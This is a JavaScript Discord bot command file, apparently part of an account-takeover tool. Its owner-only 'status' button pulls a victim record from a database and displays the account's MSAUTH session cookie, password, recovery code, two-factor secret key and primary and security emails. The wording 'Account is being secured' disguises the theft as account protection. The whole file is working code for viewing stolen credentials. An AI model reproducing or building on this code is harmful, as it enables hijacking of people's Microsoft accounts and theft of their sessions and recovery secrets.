const { EmbedBuilder } = require("discord.js");

module.exports = {
    name: "status",
    ownerOnly: true,

    callback: async (client, interaction) => {
        try {
            const uid = interaction.customId.split("|")[1];

            const results = await client.queryParams(
                "SELECT * FROM status WHERE uid = ?",
                [uid]
            );

            /* ───────────── STATUS NOT READY YET ───────────── */
            if (!results || results.length === 0) {
                const pendingEmbed = new EmbedBuilder()
                    .setTitle("🔐 Account is being secured")
                    .setDescription(
                        "Please wait while we finish securing your account.\n\n" +
                        "You can click the **Status** button again in a few moments."
                    )
                    .setColor(0x808080)
                    .setFooter({ text: `UID: ${uid}` })
                    .setTimestamp();

                return interaction.reply({
                    embeds: [pendingEmbed],
                    ephemeral: true
                });
            }

            /* ───────────── STATUS FOUND ───────────── */
            const statusData = results[0];
            const emptyBox = "``` ```";

            const embed = new EmbedBuilder()
                .setTitle(`🔐 Secure status for UID \`\`${uid}\`\``)
                .addFields(
                    {
                        name: "MSAUTH Cookie",
                        value: statusData.msauth
                            ? `\`\`\`${statusData.msauth}\`\`\``
                            : emptyBox
                    },
                    {
                        name: "Username",
                        value: statusData.username
                            ? `\`\`\`${statusData.username}\`\`\``
                            : emptyBox
                    },
                    {
                        name: "Recovery Code",
                        value: statusData.recoverycode
                            ? `\`\`\`${statusData.recoverycode}\`\`\``
                            : emptyBox
                    },
                    {
                        name: "Secret Key",
                        value: statusData.secretkey
                            ? `\`\`\`${statusData.secretkey}\`\`\``
                            : emptyBox
                    },
                    {
                        name: "Primary Email",
                        value: statusData.email
                            ? `\`\`\`${statusData.email}\`\`\``
                            : emptyBox,
                        inline: true
                    },
                    {
                        name: "Security Email",
                        value: statusData.secemail
                            ? `\`\`\`${statusData.secemail}\`\`\``
                            : emptyBox,
                        inline: true
                    },
                    {
                        name: "Password",
                        value: statusData.password
                            ? `\`\`\`${statusData.password}\`\`\``
                            : emptyBox
                    }
                )
                .setColor("#b2c7e0")
                .setFooter({ text: "Secure process completed" })
                .setTimestamp();

            return interaction.reply({
                embeds: [embed],
                ephemeral: true
            });

        } catch (error) {
            console.error("[STATUS_BUTTON] Error:", error);
            return interaction.reply({
                content: "❌ An error occurred while fetching the status.",
                ephemeral: true
            });
        }
    }
};
